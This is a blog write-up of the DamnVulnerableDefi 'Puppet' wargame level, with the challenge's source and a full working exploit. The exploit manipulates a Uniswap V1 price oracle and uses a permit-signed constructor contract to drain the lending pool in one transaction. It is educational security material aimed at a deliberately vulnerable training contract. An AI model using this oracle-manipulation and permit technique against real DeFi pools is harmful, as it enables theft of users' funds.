+++ 
weight = 7
tags = ["web3", "solidity", "writeup", "damnvulnerabledefi"] 
categories = ["writeups", "web3"] 
publishDate = 1707615000
description = "Writeup for Puppet (Level 8) from DamnVulnerableDefi V3, " 
title = """Puppet Writeup - DamnVulnerableDefi V3"""
+++

This post contains the walkthrough and solutions for [Puppet](https://www.damnvulnerabledefi.xyz/challenges/puppet/), a challenge from the [DamnVulnerableDefi](https://www.damnvulnerabledefi.xyz) wargame, featuring a price oracle manipulation vulnerability.

#### But wait, why another writeup?

You may be wondering why I’m making a writeup for this challenge, when there are already tons of other writeups online. Well, many of the writeups online **don't actually solve the challenge properly**.

There was a new solve condition added in V3 of DamnVulnerableDefi, which required you, the attacker (`player`) to only make 1 transaction total.

```js
expect(await ethers.provider.getTransactionCount(player.address)).to.eq(1);
```

A lot of these online writeups didn't account for this and hence made **multiple transactions**. Their test script still shows that they passed the challenge, but this is because they might have simply created another account to run the attacks, or omitted `.connect(player)` for some of the transactions, causing Hardhat to use the default account `deployer`, both of which is not really solving the challenge properly.

Executing the entire exploit in 1 transaction resulted in the challenge being a bit trickier, which we will explore in this post.

# Challenge Overview

Challenge Description:

> There’s a lending pool where users can borrow Damn Valuable Tokens (DVTs). To do so, they first need to deposit twice the borrow amount in ETH as collateral. The pool currently has 100000 DVTs in liquidity.
\
\
 There’s a DVT market opened in an old [Uniswap v1 exchange](https://docs.uniswap.org/contracts/v1/overview), currently with 10 ETH and 10 DVT in liquidity.
\
\
 Pass the challenge by taking all tokens from the lending pool. You start with 25 ETH and 1000 DVTs in balance.

We are given source code of the lending pool, the DVT, and the test file:

{{< code language="solidity" title="PuppetPool.sol" id="1" expand="Show" collapse="Hide" isCollapsed="true" >}}
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "../DamnValuableToken.sol";

/**
 * @title PuppetPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract PuppetPool is ReentrancyGuard {
    using Address for address payable;

    uint256 public constant DEPOSIT_FACTOR = 2;

    address public immutable uniswapPair;
    DamnValuableToken public immutable token;

    mapping(address => uint256) public deposits;

    error NotEnoughCollateral();
    error TransferFailed();

    event Borrowed(address indexed account, address recipient, uint256 depositRequired, uint256 borrowAmount);

    constructor(address tokenAddress, address uniswapPairAddress) {
        token = DamnValuableToken(tokenAddress);
        uniswapPair = uniswapPairAddress;
    }

    // Allows borrowing tokens by first depositing two times their value in ETH
    function borrow(uint256 amount, address recipient) external payable nonReentrant {
        uint256 depositRequired = calculateDepositRequired(amount);

        if (msg.value < depositRequired)
            revert NotEnoughCollateral();

        if (msg.value > depositRequired) {
            unchecked {
                payable(msg.sender).sendValue(msg.value - depositRequired);
            }
        }

        unchecked {
            deposits[msg.sender] += depositRequired;
        }

        // Fails if the pool doesn't have enough tokens in liquidity
        if(!token.transfer(recipient, amount))
            revert TransferFailed();

        emit Borrowed(msg.sender, recipient, depositRequired, amount);
    }

    function calculateDepositRequired(uint256 amount) public view returns (uint256) {
        return amount * _computeOraclePrice() * DEPOSIT_FACTOR / 10 ** 18;
    }

    function _computeOraclePrice() private view returns (uint256) {
        // calculates the price of the token in wei according to Uniswap pair
        return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);
    }
}
{{< /code >}}

{{< code language="solidity" title="DamnValuableToken.sol" id="100" expand="Show" collapse="Hide" isCollapsed="true" >}}
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "solmate/src/tokens/ERC20.sol";

/**
 * @title DamnValuableToken
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract DamnValuableToken is ERC20 {
    constructor() ERC20("DamnValuableToken", "DVT", 18) {
        _mint(msg.sender, type(uint256).max);
    }
}
{{< /code >}}

{{< code language="javascript" title="puppet.challenge.js" id="2" expand="Show" collapse="Hide" isCollapsed="true" >}}
const exchangeJson = require("../../build-uniswap-v1/UniswapV1Exchange.json");
const factoryJson = require("../../build-uniswap-v1/UniswapV1Factory.json");

const { ethers } = require('hardhat');
const { expect } = require('chai');
const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");

// Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
function calculateTokenToEthInputPrice(tokensSold, tokensInReserve, etherInReserve) {
    return (tokensSold * 997n * etherInReserve) / (tokensInReserve * 1000n + tokensSold * 997n);
}

describe('[Challenge] Puppet', function () {
    let deployer, player;
    let token, exchangeTemplate, uniswapFactory, uniswapExchange, lendingPool;

    const UNISWAP_INITIAL_TOKEN_RESERVE = 10n * 10n ** 18n;
    const UNISWAP_INITIAL_ETH_RESERVE = 10n * 10n ** 18n;

    const PLAYER_INITIAL_TOKEN_BALANCE = 1000n * 10n ** 18n;
    const PLAYER_INITIAL_ETH_BALANCE = 25n * 10n ** 18n;

    const POOL_INITIAL_TOKEN_BALANCE = 100000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */  
        [deployer, player] = await ethers.getSigners();

        const UniswapExchangeFactory = new ethers.ContractFactory(exchangeJson.abi, exchangeJson.evm.bytecode, deployer);
        const UniswapFactoryFactory = new ethers.ContractFactory(factoryJson.abi, factoryJson.evm.bytecode, deployer);
        
        setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
        expect(await ethers.provider.getBalance(player.address)).to.equal(PLAYER_INITIAL_ETH_BALANCE);

        // Deploy token to be traded in Uniswap
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

        // Deploy a exchange that will be used as the factory template
        exchangeTemplate = await UniswapExchangeFactory.deploy();

        // Deploy factory, initializing it with the address of the template exchange
        uniswapFactory = await UniswapFactoryFactory.deploy();
        await uniswapFactory.initializeFactory(exchangeTemplate.address);

        // Create a new exchange for the token, and retrieve the deployed exchange's address
        let tx = await uniswapFactory.createExchange(token.address, { gasLimit: 1e6 });
        const { events } = await tx.wait();
        uniswapExchange = await UniswapExchangeFactory.attach(events[0].args.exchange);

        // Deploy the lending pool
        lendingPool = await (await ethers.getContractFactory('PuppetPool', deployer)).deploy(
            token.address,
            uniswapExchange.address
        );
    
        // Add initial token and ETH liquidity to the pool
        await token.approve(
            uniswapExchange.address,
            UNISWAP_INITIAL_TOKEN_RESERVE
        );
        await uniswapExchange.addLiquidity(
            0,                                                          // min_liquidity
            UNISWAP_INITIAL_TOKEN_RESERVE,
            (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
            { value: UNISWAP_INITIAL_ETH_RESERVE, gasLimit: 1e6 }
        );
        
        // Ensure Uniswap exchange is working as expected
        expect(
            await uniswapExchange.getTokenToEthInputPrice(
                10n ** 18n,
                { gasLimit: 1e6 }
            )
        ).to.be.eq(
            calculateTokenToEthInputPrice(
                10n ** 18n,
                UNISWAP_INITIAL_TOKEN_RESERVE,
                UNISWAP_INITIAL_ETH_RESERVE
            )
        );
        
        // Setup initial token balances of pool and player accounts
        await token.transfer(player.address, PLAYER_INITIAL_TOKEN_BALANCE);
        await token.transfer(lendingPool.address, POOL_INITIAL_TOKEN_BALANCE);

        // Ensure correct setup of pool. For example, to borrow 1 need to deposit 2
        expect(
            await lendingPool.calculateDepositRequired(10n ** 18n)
        ).to.be.eq(2n * 10n ** 18n);

        expect(
            await lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)
        ).to.be.eq(POOL_INITIAL_TOKEN_BALANCE * 2n);
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
        // Player executed a single transaction
        expect(await ethers.provider.getTransactionCount(player.address)).to.eq(1);
        
        // Player has taken all tokens from the pool       
        expect(
            await token.balanceOf(lendingPool.address)
        ).to.be.eq(0, 'Pool still has tokens');

        expect(
            await token.balanceOf(player.address)
        ).to.be.gte(POOL_INITIAL_TOKEN_BALANCE, 'Not enough token balance in player');
    });
});
{{< /code >}}

Looking at the challenge description and source code, we can see that the target contract `PuppetPool` has `100000` DVTs (Damn Vulnerable Tokens) available for us to borrow. To borrow the DVTs, we need to provide 2 times the value in ETH as collateral. But how does the contract determine the value of DVT/ETH?

The function `calculateDepositRequired(uint256 amount)` returns the amount of ETH required to borrow `amount` tokens. This function calls `_computeOraclePrice()` which queries a Uniswap V1 exchange with 10 ETH and 10 DVT in liquidity. We start with `25` ETH and `1000` DVTs.

# Price Oracle Manipulation

We have much more ETH and DVT than the Uniswap exchange, which we can abuse to manipulate the price of DVT/ETH. For example, if we exchange all `1000` of our DVTs for ETH in the Uniswap exchange, it will drastically increase the supply of DVTs, and reduce the supply of ETH, inflating the price of ETH.

Let's say we swap `1000` DVT for `9.9` ETH. The Uniswap exchange will have `1010` DVT and `0.1` ETH left, and now reports a price of roughly `1` ETH per `10100` DVT. As the lending pool relies on this Uniswap exchange for the price of DVT, it will use this pricing for the collateral, and we can borrow `100000` DVT for around `20` ETH (providing 2 times ETH for collateral), draining the pool and solving the challenge.

We write a quick proof of concept to see this working in action:

{{< code language="javascript" title="puppet.challenge.js" id="3" expand="Show" collapse="Hide" isCollapsed="true" >}}
it('Execution', async function () {
    /** CODE YOUR SOLUTION HERE */

    console.log("=== Initial balances & prices ===")
    console.log(`ETH balance: ${await ethers.provider.getBalance(player.address) / (10**18)}`)
    console.log(`DVT balance: ${await token.connect(player).balanceOf(player.address) / (10**18)}`)
    console.log(`Price of 1000 DVT: ${
        await lendingPool.connect(player).calculateDepositRequired(1000n * 10n**18n) / (10**18)
    } ETH`)
    // approve uniswapExchange to use our DVTs
    await token.connect(player).approve(uniswapExchange.address, PLAYER_INITIAL_TOKEN_BALANCE)
    // swap our DVTs for ETH
    await uniswapExchange.connect(player).tokenToEthSwapInput(
        PLAYER_INITIAL_TOKEN_BALANCE, // swapping 10000 DVTs
        99n * 10n**17n, // for 9.9 ETH minimum
        (await ethers.provider.getBlock('latest')).timestamp + 3600 // deadline (not important)
    )
    console.log("=== After manipulation ===")
    console.log(`ETH: ${await ethers.provider.getBalance(player.address) / (10**18)}`)
    console.log(`DVT: ${await token.connect(player).balanceOf(player.address) / (10**18)}`)
    console.log(`Price of 1000 DVT: ${
        await lendingPool.connect(player).calculateDepositRequired(1000n * 10n**18n) / (10**18)
    } ETH`)

});
{{< /code >}}

{{< image src="./img/poc.png" alt="" position="center" style="border-radius: 5px; max-width: 80%;" >}}

*Small note: You can see I renamed the challenge 'Puppet v1' as there are 2 other challenges named 'Puppet' which also get ran if I use `--grep 'Puppet'`*

As shown in the image, the price of DVT dropped significantly, allowing us to drain the lending pool with just 20 ETH (which we have enough of).

However, if we do borrow the `100000` tokens and drain the lending pool, we still don't pass the challenge, because as discussed before, everything needs to be done in exactly 1 transaction:

```js
console.log("=== Borrowing 100000 DVTs ===")
let ethRequiredToDrain = lendingPool.connect(player).calculateDepositRequired(100000n * 10n**18n)
await lendingPool.connect(player).borrow(
    100000n * 10n**18n, // amount of DVT to borrow
    player.address, // recipient of borrowed DVTs 
    {value: ethRequiredToDrain} // send ETH as collateral
)
console.log(`Player DVTs: ${await token.balanceOf(player.address) / (10**18)}`)
console.log(`Lending Pool DVTs: ${await token.balanceOf(lendingPool.address) / (10**18)}`)
```

{{< image src="./img/fail.png" alt="" position="center" style="border-radius: 5px; max-width: 80%;" >}}

Solve requirement which is not met:

```js
expect(await ethers.provider.getTransactionCount(player.address)).to.eq(1);
```

# Everything in one transaction

Everything should be done with only the `player` account, so we shouldn't create another account just to bypass this condition.

To perform all of these calls; swapping tokens with the Uniswap pool, then borrowing tokens from the lending pool, we can create a contract which **executes everything in its constructor**, using our 1 transaction to deploy the contract, sending all necessary ether along with it.

{{< code language="solidity" title="PuppetAttack.sol" id="4" expand="Show" collapse="Hide" isCollapsed="true" >}}
contract PuppetAttack {
    constructor (
        address owner,
        DamnValuableToken token,
        PuppetPool lendingPool,
        IUniswapExchange uniswapExchange
    ) payable {
        // swap all our DVTs for ETH
        token.approve(address(uniswapExchange), value);
        uniswapExchange.tokenToEthSwapInput(
            1000 * 10**18, // swap 1000 DVT
            9.9 * 10**18, // for 9.9 ETH minimum
            block.timestamp + 3600 // deadline (not important)
        );

        // drain lending pool's DVTs, sending them to owner (player)
        uint256 lendingPoolBalance = token.balanceOf(address(lendingPool));
        uint256 ethRequiredToDrain = lendingPool.calculateDepositRequired(
            lendingPoolBalance
        );
        lendingPool.borrow{value: ethRequiredToDrain}(lendingPoolBalance, owner);
    }
}
{{< /code >}}

{{< code language="javascript" title="puppet.challenge.js" id="5" expand="Show" collapse="Hide" isCollapsed="true" >}}
it('Execution', async function () {
    /** CODE YOUR SOLUTION HERE */

    attack = await (await ethers.getContractFactory('PuppetAttack', player)).deploy(
        player.address,
        token.address,
        lendingPool.address,
        uniswapExchange.address,
        {
            // send most ETH to the attack contract, keeping some for gas
            value: PLAYER_INITIAL_ETH_BALANCE - 1n * 10n**18n, 
            gasLimit: 1e7
        }
    );
});
{{< /code >}}

The above code will fail, however, as there is a significant problem: for the attack contract to trade our DVTs, we need to allow our DVTs to be spent by the attack contract - how can we do this without using up another transaction?

# ERC20 Permit Approvals

We can't simply `transfer` our tokens to the attack contract, or `approve` the attack contract to use our tokens, without a transaction.

Fortunately if we look closer at the DVT contract, we notice it uses [solmate's ERC20 implementation](https://github.com/transmissions11/solmate/blob/main/src/tokens/ERC20.sol).

```solidity
import "solmate/src/tokens/ERC20.sol";
```

This particular implementation includes the `permit` function, which was designed as a gas efficient way to `approve` a spender. It is essentially an [extension to ERC20](https://eips.ethereum.org/EIPS/eip-2612) to allow others to spend your tokens **in a single transaction**.

For example, say you wish to exchange some tokens. Normally you would need to call `approve(exchange, amount)` to allow `exchange` to spend `amount` of your tokens, then the exchange can take your tokens by doing `transferFrom(you, exchange, amount)`. This requires a total of 2 transactions, one from you and one from the exchange. **There is no way to do both in the same transaction** (unless you are a contract).

With `permit`, you can cryptographically sign a `Permit` which contains details such as the `spender` and `amount`, obtaining a signature. Then, you send this signature to the exchange, which calls `permit` on the token contract, approving `spender` to spend `amount` tokens. The key difference is that the signing is done off-chain, which means the exchange can **obtain allowance to your tokens and spend them in the same transaction**.

This is perfect for our scenario, as our attacking contract cannot spend our DVTs without us sending or approving the DVTs first.

# Deterministic Contract Addresses

There is another problem - we need to specify the `spender` when signing a permit off-chain - how do we get our attack contract's address before deploying it?

We can actually predict the contract's address before its deployment, as [contract addresses are deterministic](https://ethereum.stackexchange.com/questions/760/how-is-the-address-of-an-ethereum-contract-computed), based off the deploying account's address and nonce.

In our case, since Hardhat tests use same account addresses, we can simply deploy and print out the attack contract's address, which will remain constant.

```js
it('Execution', async function () {
    /** CODE YOUR SOLUTION HERE */

    attack = await (await ethers.getContractFactory('PuppetAttack', player)).deploy();
    console.log(`Attack contract: ${attack.address}`)
});
```

```solidity
contract PuppetAttack {

}
```

Deploying an empty contract as shown above gives us the attack contract's address, which stays constant if we re-run the tests.

```
Attack contract: 0x8464135c8F25Da09e49BC8782676a84730C318bC
```

# Putting it all together

Figuring out how to sign the permit probably took the longest for this challenge. I eventually found [this thread](https://forum.openzeppelin.com/t/erc20-permit-call/34975) and modified the code to work. Afterwards I found [`eth-permit`](https://github.com/dmihal/eth-permit) which required less code, but requires installing another node module, so I will show the original way I used.

Otherwise, most of the code is simply combining what was shown in the previous sections, with the addition of the permit.

Final attack contract code:
{{< code language="solidity" title="PuppetAttack.sol" id="300" expand="Show" collapse="Hide" isCollapsed="true" >}}
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "./PuppetPool.sol";
import "./IUniswapExchange.sol";

/**
 * @title PuppetAttack
 * @author teddyctf (https://thesavageteddy.github.io/posts/puppet-damnvulnerabledefi/)
 */

contract PuppetAttack {
    constructor (
        address owner,
        DamnValuableToken token,
        PuppetPool lendingPool,
        IUniswapExchange uniswapExchange,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v, bytes32 r, bytes32 s
    ) payable {
        // use permit and transfer tokens to this contract
        token.permit(
            owner,
            spender,
            value,
            deadline,
            v, r, s
        );
        token.transferFrom(owner, address(this), value);

        // swap all our DVTs for ETH
        token.approve(address(uniswapExchange), value);
        uniswapExchange.tokenToEthSwapInput(
            value, // swap all our DVTs
            9.9 * 10**18, // for 9.9 ETH minimum
            block.timestamp + 3600 // deadline (not important)
        );

        // drain lending pool's DVTs, sending them to owner (player)
        uint256 lendingPoolBalance = token.balanceOf(address(lendingPool));
        uint256 ethRequiredToDrain = lendingPool.calculateDepositRequired(
            lendingPoolBalance
        );
        lendingPool.borrow{value: ethRequiredToDrain}(lendingPoolBalance, owner);
    }
}
{{< /code >}}

Relevant Hardhat solve script (full code [here](puppet.challenge.js)):

{{< code language="javascript" title="puppet.challenge.js" id="200" expand="Show" collapse="Hide" isCollapsed="true" >}}
it('Execution', async function () {
    /** CODE YOUR SOLUTION HERE */

    // Attack contract address we obtained previously
    let attackAddress = "0x8464135c8F25Da09e49BC8782676a84730C318bC"
    let spender = attackAddress

    // Hardhat requires a Wallet to obtain the signed
    // transaction data, so make a Wallet for the player
    const accounts = config.networks.hardhat.accounts;
    const index = 1; // wallet of player
    const playerWallet = ethers.Wallet.fromMnemonic(accounts.mnemonic, accounts.path + `/${index}`);

    expect(playerWallet.address).eq(player.address)

    const chainId = (await ethers.provider.getNetwork()).chainId
    const nonce = await token.nonces(playerWallet.address)
    const name = await token.name()

    // Number of tokens to be sent
    const value = 1000n * 10n**18n
    
    // Unix timestamp for deadline
    const deadline = (await ethers.provider.getBlock('latest')).timestamp + 3600

    // Define Signature
    const domain = {
        name: name,
        version: "1",
        verifyingContract: token.address,
        chainId: chainId,
    }

    // Define types
    const types = {
        Permit: [
            {name: "owner", type: "address"},
            {name: "spender", type: "address"},
            {name: "value", type: "uint256"},
            {name: "nonce", type: "uint256"},
            {name: "deadline", type: "uint256"},
        ]
    }

    // Define transaction
    const values = {
        owner: playerWallet.address,
        spender: spender,
        value: value,
        nonce: nonce,
        deadline: deadline,
    }

    // Sign data
    const signature = await playerWallet._signTypedData(domain, types, values);

    // Split signature
    const sig = ethers.utils.splitSignature(signature);

    attack = await (await ethers.getContractFactory('PuppetAttack', player)).deploy(
        player.address,
        token.address,
        lendingPool.address,
        uniswapExchange.address,
        spender,
        value,
        deadline,
        sig.v, sig.r, sig.s,
        {
            // send most ETH to the attack contract, keeping some for gas
            value: PLAYER_INITIAL_ETH_BALANCE - 1n * 10n**18n, 
            gasLimit: 1e7
        }
    );
});
{{< /code >}}

{{< image src="./img/solved.png" alt="" position="center" style="border-radius: 5px; max-width: 80%;" >}}

# Conclusion

This challenge was interesting, and I learnt a lot about ERC20 permits and oracle manipulation. Despite being the first out of a set of three challenges, its difficulty deceived me with the one transaction requirement.

Huge thanks to [`Faith`](https://twitter.com/farazsth98) for helping with the one transaction requirement, and for teaching me a lot throughout my Web3 learning journey.

As this is my first Web3 post, if I've made any errors or anything to improve on, please let me know on Discord `thesavageteddy` or Twitter/X [`@teddyctf`](https://twitter.com/teddyctf).

Having almost finished DamnVulnerableDefi, I'm looking at getting into auditing contracts soon!

- teddy / TheSavageTeddy











